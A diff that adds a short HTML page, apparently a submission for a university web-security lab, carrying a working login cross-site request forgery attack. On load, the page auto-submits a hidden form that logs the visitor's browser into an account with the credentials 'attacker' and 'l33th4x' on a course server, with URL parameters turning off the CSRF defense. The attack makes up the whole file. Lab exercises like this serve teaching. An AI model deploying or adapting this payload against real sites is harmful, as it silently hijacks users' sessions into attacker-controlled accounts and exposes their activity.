@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+	<head>
+	</head>
+<body onload = "launch()">
+	<form id="loginform" action=" http://trurl.cs.illinois.edu/login?csrfdefense=0&xssdefense=5" method="POST">
+	    <input type="hidden" name="username" value="attacker"/><br>
+	    <input type="hidden" name="password" value="l33th4x"/><br>
+	    <input type="submit" name = "launch"/><br>
+	  </form>
+	<script>
+		function launch(){
+			document.getElementById("loginform").submit();
+		}
+	</script>
+</body>
+</html>
+
